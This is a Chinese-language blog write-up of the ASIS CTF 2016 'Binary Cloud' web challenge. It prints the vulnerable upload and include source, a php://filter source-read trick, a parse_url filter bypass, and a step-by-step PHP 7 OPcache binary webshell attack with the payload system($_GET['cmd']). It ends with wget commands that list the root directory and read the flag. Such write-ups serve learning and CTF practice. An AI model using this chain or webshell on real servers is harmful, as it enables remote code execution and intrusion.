---
title: Asis2016_Binary Cloud
date: 2016-05-10 20:12:00
tags:
- Blogs
- ctf
- php
categories:
- Blogs
---

上周的asis2016比赛中，有个很特别的题目叫Binary Cloud，而getshell的方法是前段时间的才爆出来的Binary Webshell Through OPcache in PHP 7，在实战环境中比较有趣~(～￣▽￣)～

<!--more-->

题目实际没做出来当时，后来看了ctftime的wp
[http://corb3nik.github.io/asis%202016/Binary-Cloud/](http://corb3nik.github.io/asis%202016/Binary-Cloud/)

# 收集信息
首先发现存在
```robots.txt
User-Agent: *
Disallow: /
Disallow: /debug.php
Disallow: /cache
Disallow: /uploads
```
打开看到/uploads和/cache会爆forbidden,在debug页面我们发现了`phpinfo()`
我们可以看到php版本是**php7.0.4**

根据上面得到的信息，我们猜测OPcache是被允许的，而OPcache对应的位置就是robots.txt上对应的/cache
```
opcache.file_cache=/home/binarycloud/www/cache
```

再翻翻看站内发现存在文件上传和文件包含，甚至可以通过文件包含来读取文件的源码
**http://binarycloud.asis-ctf.ir?page=php://filter/convert.base64-encode/resource=upload**

```upload.php
<?php
function ew($haystack, $needle) {
    return $needle === "" || (($temp = strlen($haystack) - strlen($needle)) &gt;= 0 &amp;&amp; strpos($haystack, $needle, $temp) !== false);
}

function filter_directory(){
  $data = parse_url($_SERVER['REQUEST_URI']);
  $filter = ["cache", "binarycloud"];
  foreach($filter as $f){
    if(preg_match("/".$f."/i", $data['query'])){
      die("Attack Detected");
    }
  }
}

function error($msg){
  die("&lt;script&gt;alert('$msg');history.go(-1);&lt;/script&gt;");
}

filter_directory();

if($_SERVER['QUERY_STRING'] &amp;&amp; $_FILES['file']['name']){
  if(!file_exists($_SERVER['QUERY_STRING'])) error("error3");
  $name = preg_replace("/[^a-zA-Z0-9\.]/", "", basename($_FILES['file']['name']));
        if(ew($name, ".php")) error("error");
  $filename = $_SERVER['QUERY_STRING'] . "/" . $name;
  if(file_exists($filename)) error("exists");
  if (move_uploaded_file($_FILES['file']['tmp_name'], $filename)){
    die("uploaded at &lt;a href=$filename&gt;$filename&lt;/a&gt;&lt;hr&gt;&lt;a href='javascript:history.go(-1);'&gt;Back&lt;/a&gt;");
  }else{
    error("error");
  }
}
?>
```

```index.php
<?php

define("__INTERNAL__", "TRUE");
if(debug_backtrace()) goto pitfall;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>BinaryCloud &mdash; Upload your files, except PHP scripts!</title>
    <link href="//netdna.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <header class="navbar navbar-default navbar-fixed-top" role="banner">
        <div class="header container">
            <div class="navbar-header">
                <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                </button>
                <a href="/" class="navbar-brand">BinaryCloud</a>
            </div>
            <nav class="collapse navbar-collapse" role="navigation">
                <ul class="nav navbar-nav">
                    <li><a href="?page=upload">Upload</a></li>
                </ul>
            </nav>
        </div>
    </header>
    <div style="margin-bottom:30px;"></div>
    <div class="container">
<?php

$filter = ["compress.zlib", "glob", "data", "http", "ftp", "phar"];
foreach($filter as $f){
    stream_wrapper_unregister($f);
}
if(!$_GET) $_GET = Array("page" => NULL);
$page = ($_GET['page'] ? $_GET['page'] : "home");
@include($page . ".php");

?>
    </div>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type='text/javascript'></script>
</body>
</html>
<?php
pitfall:
?>

```

仔细阅读下源码，可以的到一些信息
1、首先我们发现我们无法上传.php文件，在包含时会自动补上.php
2、我们不能包含带有cache或者binaryload的链接
3、我们上传的文件名字会经过preg_replace()和basename()

结合前面的信息我们想到了我们可以通过注入`.php.bin`这样的方式getshell，也就是前面提到的**Binary Webshell Through OPcache in PHP 7**

# bypass目录过滤

在upload.php我们看到
```
function filter_directory(){
  $data = parse_url($_SERVER['REQUEST_URI']);
  $filter = ["cache", "binarycloud"];
  foreach($filter as $f){
    if(preg_match("/".$f."/i", $data['query'])){
      die("Attack Detected");
    }
  }
}
```
发现一个特殊的是`parse_url($_SERVER['REQUEST_URI'])`
这里也是没见过的黑科技
老外是这么说的
**This function can be bypassed though, as parse_url takes a URL as a parameter. It does not deal well with URIs.**
通过parse_url获取URL的参数有一点儿问题，他并不能很好的处理，如果我们传入的是
**///upload.php?cache**这样的地址，然后parse_url()处理URL会返回false，那么后面的preg_match就不会匹配到任何字符串了。



# 通过Binary Webshell Through OPcache in PHP 7 getshell

首先原理我们需要先了解一下
[http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/](http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/)
wooyun有翻译的文章
[http://drops.wooyun.org/web/15450](http://drops.wooyun.org/web/15450)

而现在我们的目标是通过重写debug.php、upload.php、index.php的缓存。

首先我们需要生成一个debug.php.bin，就是下面这个文件的编译版
```
<?php
  system($_GET['cmd']);
?>
```
根据文章我们还需要计算出system_id
这个不错的脚本是
[https://github.com/GoSecure/php7-opcache-override](https://github.com/GoSecure/php7-opcache-override)
```
$ ./system_id_scraper.py https://binarycloud.asis-ctf.ir/debug.php
PHP version : 7.0.4-7ubuntu2
Zend Extension ID : API320151012,NTS
Zend Bin ID : BIN_SIZEOF_CHAR48888
Assuming x86_64 architecture
------------
System ID : 81d80d78c6ef96b89afaadc7ffc5d7ea
```
需要跑一下`phpinfo()`的页面

然后我们在本地生成恶意的`debug.php.bin`文件，首先是用十六进制编辑器修改文件开头的systemid，上传
需要注意的是debug.php.bin的路径
```
[cache location][system id][document root][debug.php.bin]
```
在这里的题目就是
```
cache/81d80d78c6ef96b89afaadc7ffc5d7ea/home/banarycloud/www
```

之后我们访问`https://binarycloud.asis-ctf.ir/debug.php`就是我们的webshell了
```
 wget -qO- https://binarycloud.asis-ctf.ir/debug.php?cmd="ls /"
WH4T_1S_7H3_FL4G
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```
```
$ wget -qO- https://binarycloud.asis-ctf.ir/debug.php?cmd="cat /WH4T_1S_7H3_FL4G"
ASIS{5e00f204374f9ce481acc97294eda1f0}
```